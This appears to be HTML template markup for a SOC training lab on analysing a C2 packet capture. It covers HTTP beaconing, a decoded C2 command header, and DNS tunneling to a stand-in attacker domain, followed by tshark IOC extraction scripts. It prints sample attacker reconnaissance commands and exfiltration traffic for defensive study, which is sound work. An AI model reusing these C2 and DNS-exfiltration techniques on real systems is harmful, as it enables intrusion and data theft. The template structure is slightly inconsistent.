<template id="tpl-scenario">
<article class="topic">
  <h2>Scenario</h2>

  <div class="callout lab">
    <strong>Lab: C2 PCAP Analysis</strong><br>
    You are a SOC analyst. An EDR alert fired on <strong>WORKSTATION-7</strong> (10.0.7.14) flagging suspicious PowerShell execution. The endpoint team captured 15 minutes of network traffic. Your task is to analyze the PCAP and determine if a C2 channel is present, extract IOCs, and document findings.
  </div>

  <h3>Environment</h3>
  <div class="table-wrap">
    <table>
      <thead><tr><th>Asset</th><th>IP / Value</th><th>Notes</th></tr></thead>
      <tbody>
        <tr><td>Victim workstation</td><td>10.0.7.14</td><td>WORKSTATION-7, Windows 10 Pro</td></tr>
        <tr><td>Internal DNS server</td><td>10.0.1.5</td><td>Corporate DNS resolver</td></tr>
        <tr><td>Internal web proxy</td><td>10.0.1.10</td><td>Squid proxy (all web goes through this)</td></tr>
        <tr><td>EDR alert time</td><td>14:22:11 UTC</td><td>PowerShell with -EncodedCommand flag</td></tr>
        <tr><td>PCAP window</td><td>14:15:00 – 14:30:00 UTC</td><td>15 minutes captured on mirror port</td></tr>
      </tbody>
    </table>
  </div>

  <h3>Lab Objectives</h3>
  <ul>
    <li>Step 1 — Protocol Hierarchy: understand traffic composition</li>

    <li>Step 3 — Follow TCP Stream: read C2 commands and victim responses</li>
    <li>Step 4 — DNS Tunneling: detect secondary exfiltration channel</li>

<!-- ════════════════════════ Step 2 — HTTP Beaconing ════════════════════════ -->
<template id="tpl-step2">
<article class="topic">
  <h2>Step 2 — HTTP Beaconing Identification</h2>

  <h3>Filter HTTP Traffic</h3>
  <pre><code><span class="cm"># Apply filter to packet list</span>
http.request

<span class="cm"># Also check: what IPs are being contacted?</span>
http and ip.src == 10.0.7.14</code></pre>

  <h3>Observed HTTP Requests</h3>
  <pre><code>No.    Time        Src IP       Dst IP          Protocol  Info
────────────────────────────────────────────────────────────────────────────────
 412  14:15:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
 501  14:16:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
 588  14:17:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
 671  14:18:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
 754  14:19:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
 837  14:20:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
 921  14:21:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
1012  14:22:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
1104  14:23:04    10.0.7.14    198.51.100.23   HTTP      GET /jquery.min.js HTTP/1.1
<span class="cm">... continues every 60 seconds for entire capture ...</span></code></pre>

  <div class="callout warn">
    <strong>Confirmed Beaconing:</strong> WORKSTATION-7 contacts 198.51.100.23 via HTTP GET every <strong>exactly 60 seconds</strong>. The URI (<code>/jquery.min.js</code>) disguises the C2 check-in as a JavaScript resource fetch. This is a classic C2 beacon pattern.
  </div>

  <h3>Examine the Request Headers</h3>
  <pre><code><span class="cm"># Click packet 412 → expand HTTP in packet details pane</span>

GET /jquery.min.js HTTP/1.1\r\n
Host: 198.51.100.23\r\n
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n
Accept: */*\r\n
Cookie: session=dXNlcj13b3Jrc3RhdGlvbjc7aWQ9MDAxMjM0\r\n
\r\n</code></pre>

  <div class="callout note">
    <strong>Suspicious Cookie:</strong> The <code>session</code> cookie value (<code>dXNlcj13b3Jrc3RhdGlvbjc7aWQ9MDAxMjM0</code>) is base64-encoded. Decode it:
    <pre><code>echo "dXNlcj13b3Jrc3RhdGlvbjc7aWQ9MDAxMjM0" | base64 -d
<span class="cm"># Output: user=workstation7;id=001234</span></code></pre>
    This is victim system identification data being sent to the C2 on each check-in.
  </div>

  <h3>Confirm with tshark</h3>
  <pre><code><span class="cm"># Extract timestamps and intervals between beacon packets</span>
tshark -r workstation7.pcap \
  -Y "http.request and ip.dst == 198.51.100.23" \
  -T fields -e frame.time_epoch -e http.request.uri \
  | awk 'NR&gt;1{print $1-prev, $2; prev=$1} NR==1{prev=$1}'
<span class="cm"># Output:</span>
<span class="cm"># 60.02  /jquery.min.js</span>
<span class="cm"># 59.98  /jquery.min.js</span>
<span class="cm"># 60.00  /jquery.min.js</span>
<span class="cm"># 60.01  /jquery.min.js</span>
<span class="cm"># Regular 60-second intervals = confirmed beacon</span></code></pre>
</article>
</template>

<!-- ════════════════════════ Step 3 — Follow TCP Stream ═════════════════════ -->
<template id="tpl-step3">
<article class="topic">
  <h2>Step 3 — Follow TCP Stream (C2 Commands)</h2>

  <h3>Find the Interactive Session</h3>
  <pre><code><span class="cm"># The beaconing GETs get 200 OK with small responses usually</span>
<span class="cm"># But some responses are larger — the C2 issued a command</span>
http.response.code == 200 and ip.src == 198.51.100.23

<span class="cm"># Check Content-Length in responses — look for large ones</span>
<span class="cm"># Packet 921 (14:22:04) response: Content-Length: 4096</span>
<span class="cm"># All others: Content-Length: 42  (just the minimal ack)</span></code></pre>

  <h3>Follow TCP Stream on the C2 Session</h3>
  <pre><code><span class="cm"># Right-click packet 921 → Follow → TCP Stream</span></code></pre>

  <h3>Stream Contents (Stream 7)</h3>
  <pre><code><span class="cm">--- Client → Server (Red) ---</span>
GET /jquery.min.js HTTP/1.1
Host: 198.51.100.23
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Cookie: session=dXNlcj13b3Jrc3RhdGlvbjc7aWQ9MDAxMjM0

<span class="cm">--- Server → Client (Blue) ---</span>
HTTP/1.1 200 OK
Content-Type: application/javascript
Content-Length: 4096
X-Command: d2hvYW1pCmhvc3RuYW1lCmlwY29uZmlnIC9hbGwKbmV0IHVzZXIgL2RvbWFpbg==

/* minified jquery v3.6.0 */
!function(e,t){"use strict"; /* ... padding ... */</code></pre>

  <div class="callout warn">
    <strong>Custom C2 Header Found:</strong> The response contains a non-standard HTTP header <code>X-Command</code> with a base64-encoded value. This is how the C2 delivers commands while hiding them in what appears to be a normal web response.
  </div>

  <h3>Decode the Command</h3>
  <pre><code><span class="cm"># Decode X-Command value</span>
echo "d2hvYW1pCmhvc3RuYW1lCmlwY29uZmlnIC9hbGwKbmV0IHVzZXIgL2RvbWFpbg==" | base64 -d
<span class="cm"># Output:</span>
whoami
hostname
ipconfig /all
net user /domain</code></pre>

  <h3>Find the Response — POST with Command Output</h3>
  <pre><code><span class="cm"># The next beacon (60s later) sends output back as POST body</span>
http.request.method == "POST" and ip.dst == 198.51.100.23

<span class="cm"># Follow TCP stream on POST packet:</span>
POST /jquery.min.js HTTP/1.1
Host: 198.51.100.23
Content-Type: application/octet-stream
Content-Length: 312

<span class="cm"># POST body (base64 encoded command output):</span>
bnQgYXV0aG9yaXR5XHN5c3RlbQpXT1JLU1RBVElPTi03CldpbmRvd3MgSVAgQ29uZmlndXJ...

<span class="cm"># Decode:</span>
echo "bnQgYXV0aG9yaXR5XHN5c3RlbQpXT1JLU1RBVElPTi03..." | base64 -d
<span class="cm"># Output:</span>
nt authority\system
WORKSTATION-7
Windows IP Configuration...
  IP Address: 10.0.7.14
  Subnet Mask: 255.255.255.0
  Default Gateway: 10.0.7.1</code></pre>

  <div class="callout warn">
    <strong>Confirmed:</strong> The attacker has SYSTEM-level access. Command output confirms the victim is <code>WORKSTATION-7</code> at <code>10.0.7.14</code>. This is an active, bidirectional C2 channel.
  </div>
</article>
</template>

<!-- ════════════════════════ Step 4 — DNS Tunneling ═════════════════════════ -->
<template id="tpl-step4">
<article class="topic">
  <h2>Step 4 — DNS Tunneling Detection</h2>

  <h3>Investigate the High DNS Volume</h3>
  <pre><code><span class="cm"># Filter DNS queries only</span>
dns.flags.response == 0

<span class="cm"># Count queries per domain in tshark</span>
tshark -r workstation7.pcap \
  -Y "dns.flags.response == 0" \
  -T fields -e dns.qry.name \
  | sed 's/^[^.]*\.//' \
  | sort | uniq -c | sort -rn | head -10
<span class="cm"># Output:</span>
<span class="cm">#  1847  exfil.attacker-c2.net</span>
<span class="cm">#    98  windowsupdate.microsoft.com</span>
<span class="cm">#    41  api.example.com</span>
<span class="cm">#    12  ocsp.digicert.com</span></code></pre>

  <div class="callout warn">
    <strong>1,847 DNS queries to a single domain:</strong> This is massively abnormal. Normal legitimate DNS has diverse destinations. Over 1800 queries to <code>exfil.attacker-c2.net</code> in 15 minutes confirms DNS tunneling.
  </div>

  <h3>Inspect Individual DNS Queries</h3>
  <pre><code><span class="cm"># Filter queries to the suspicious domain</span>
dns.qry.name contains "attacker-c2.net"

<span class="cm"># Sample queries visible in packet list:</span>
No.   Time      Query Name
──────────────────────────────────────────────────────────────────────────
 145  14:15:07  YW1zaS5kbGw.exfil.attacker-c2.net
 146  14:15:07  dmFsdWVzLmNzdi5vcGVu.exfil.attacker-c2.net
 147  14:15:07  dC5sb2NhbGhvc3Q.exfil.attacker-c2.net
 148  14:15:07  cyBhbmQgc2Vuc2l0aXZl.exfil.attacker-c2.net
 149  14:15:07  IGRhdGEgZnJvbSBzeXN0.exfil.attacker-c2.net
 150  14:15:07  ZW0gZGlyZWN0b3J5.exfil.attacker-c2.net
<span class="cm">... 1841 more queries ...</span></code></pre>

  <h3>Decode a Subdomain Sample</h3>
  <pre><code><span class="cm"># The subdomains are base64-encoded chunks of exfiltrated data</span>
<span class="cm"># Concatenate a few and decode:</span>

echo "YW1zaS5kbGwgdmFsdWVzLmNzdi5vcGVuIHQubG9jYWxob3N0IHMgYW5kIHNlbnNpdGl2ZSBkYXRhIGZyb20gc3lzdGVtIGRpcmVjdG9yeQ==" | base64 -d
<span class="cm"># Output:</span>
amsi.dll values.csv.open t.localhost s and sensitive data from system directory

<span class="cm"># The attacker is exfiltrating file contents by encoding them</span>
<span class="cm"># and sending each chunk as a DNS subdomain query</span>
<span class="cm"># The attacker's authoritative DNS server logs all queries</span></code></pre>

  <h3>Reconstruct Exfiltrated Data</h3>
  <pre><code><span class="cm"># Extract all subdomains from attacker domain queries</span>
tshark -r workstation7.pcap \
  -Y "dns.qry.name contains \"attacker-c2.net\" and dns.flags.response == 0" \
  -T fields -e dns.qry.name \
  | sed 's/\..*//' \
  | tr -d '\n' \
  | base64 -d 2&gt;/dev/null
<span class="cm"># Attempt to reconstruct full exfiltrated content from DNS stream</span>

<span class="cm"># Additional indicators:</span>
<span class="cm"># - Queries with TXT record type (another tunnel variant)</span>
dns.qry.type == 16 and dns.qry.name contains "attacker-c2.net"

<span class="cm"># - Unusual query rate (queries per second)</span>
<span class="cm"># 1847 queries / 900 seconds = ~2 queries/second = automated exfil</span></code></pre>

  <h3>DNS Tunneling IOCs Identified</h3>
  <div class="table-wrap">
    <table>
      <thead><tr><th>Indicator</th><th>Value</th><th>Type</th></tr></thead>
      <tbody>
        <tr><td>Suspicious domain</td><td>exfil.attacker-c2.net</td><td>Domain IOC</td></tr>
        <tr><td>Query volume</td><td>1,847 in 15 minutes</td><td>Behavioral anomaly</td></tr>
        <tr><td>Average subdomain length</td><td>28 characters (base64)</td><td>Encoding indicator</td></tr>
        <tr><td>Query type</td><td>A records (type 1)</td><td>Tunneling via A queries</td></tr>
      </tbody>
    </table>
  </div>
</article>
</template>

<!-- ════════════════════════ Step 5 — tshark IOC Extraction ═════════════════ -->
<template id="tpl-step5">
<article class="topic">
  <h2>Step 5 — tshark IOC Extraction</h2>
  <p>Automate IOC collection from the PCAP using tshark one-liners. These can be added to a script for repeatable analysis.</p>

  <h3>Extract All External IPs Contacted</h3>
  <pre><code><span class="cm"># All unique destination IPs from workstation (excluding RFC1918)</span>
tshark -r workstation7.pcap \
  -Y "ip.src == 10.0.7.14" \
  -T fields -e ip.dst \
  | grep -v "^10\.\|^192\.168\.\|^172\.\(1[6-9]\|2[0-9]\|3[01]\)\." \
  | sort -u

<span class="cm"># Output:</span>
198.51.100.23    <span class="cm"># C2 HTTP beacon server</span>
203.0.113.8      <span class="cm"># DNS A record response for attacker-c2.net</span></code></pre>

  <h3>Extract All DNS Queries</h3>
  <pre><code><span class="cm"># All unique domain names queried from workstation</span>
tshark -r workstation7.pcap \
  -Y "dns.flags.response == 0 and ip.src == 10.0.7.14" \
  -T fields -e dns.qry.name \
  | sort -u

<span class="cm"># All external domains (strip internal .corp / .local)</span>
tshark -r workstation7.pcap \
  -Y "dns.flags.response == 0 and ip.src == 10.0.7.14" \
  -T fields -e dns.qry.name \
  | grep -v "\.corp\.\|\.local\.\|microsoft\.com\|windows\.com" \
  | sort -u

<span class="cm"># Output (suspicious):</span>
attacker-c2.net
exfil.attacker-c2.net</code></pre>

  <h3>Extract HTTP User Agents</h3>
  <pre><code><span class="cm"># Unique User-Agent strings from workstation</span>
tshark -r workstation7.pcap \
  -Y "http.user_agent and ip.src == 10.0.7.14" \
  -T fields -e http.user_agent \
  | sort -u

<span class="cm"># Output:</span>
<span class="cm"># Mozilla/5.0 (Windows NT 10.0; Win64; x64)    ← C2 beacon (generic)</span>
<span class="cm"># Microsoft-CryptoAPI/10.0                      ← Windows update check (legit)</span></code></pre>

  <h3>Extract HTTP URIs and Hosts</h3>
  <pre><code><span class="cm"># All HTTP requests from workstation with host + URI</span>
tshark -r workstation7.pcap \
  -Y "http.request and ip.src == 10.0.7.14" \
  -T fields -e frame.time -e http.host -e http.request.uri

<span class="cm"># Output:</span>
<span class="cm"># 14:15:04  198.51.100.23  /jquery.min.js</span>
<span class="cm"># 14:16:04  198.51.100.23  /jquery.min.js</span>
<span class="cm"># ...</span></code></pre>

  <h3>Extract TLS SNI Values</h3>
  <pre><code><span class="cm"># All TLS destinations (by SNI) from workstation</span>
tshark -r workstation7.pcap \
  -Y "tls.handshake.type == 1 and ip.src == 10.0.7.14" \
  -T fields -e tls.handshake.extensions_server_name \
  | sort -u

<span class="cm"># Compare against known-good / blocklist</span></code></pre>

  <h3>Export HTTP Objects</h3>
  <pre><code><span class="cm"># Extract all files transferred over HTTP</span>
tshark -r workstation7.pcap --export-objects http,/tmp/http_export/
ls -lh /tmp/http_export/

<span class="cm"># Hash all extracted files for threat intel lookup</span>
sha256sum /tmp/http_export/* &gt; /tmp/file_hashes.txt

<span class="cm"># Check hashes against VirusTotal (with API key)</span>
<span class="cm"># while read hash file; do</span>
<span class="cm">#   curl -s "https://www.virustotal.com/api/v3/files/$hash" \</span>
<span class="cm">#     -H "x-apikey: YOUR_VT_KEY" | jq '.data.attributes.last_analysis_stats'</span>
<span class="cm"># done &lt; /tmp/file_hashes.txt</span></code></pre>

  <h3>Full IOC Extraction Script</h3>
  <pre><code>#!/bin/bash
PCAP="workstation7.pcap"
OUT="/tmp/iocs"
mkdir -p "$OUT"

<span class="cm"># External IPs</span>
tshark -r "$PCAP" -Y "ip.src == 10.0.7.14" \
  -T fields -e ip.dst | sort -u | \
  grep -v "^10\.\|^192\.168\.\|^172\." &gt; "$OUT/external_ips.txt"

<span class="cm"># DNS queries</span>
tshark -r "$PCAP" -Y "dns.flags.response==0 and ip.src==10.0.7.14" \
  -T fields -e dns.qry.name | sort -u &gt; "$OUT/dns_queries.txt"

<span class="cm"># HTTP hosts</span>
tshark -r "$PCAP" -Y "http.request and ip.src==10.0.7.14" \
  -T fields -e http.host | sort -u &gt; "$OUT/http_hosts.txt"

<span class="cm"># TLS SNI</span>
tshark -r "$PCAP" -Y "tls.handshake.type==1 and ip.src==10.0.7.14" \
  -T fields -e tls.handshake.extensions_server_name | sort -u &gt; "$OUT/tls_sni.txt"

echo "IOCs written to $OUT/"
ls -lh "$OUT/"</code></pre>
</article>
</template>
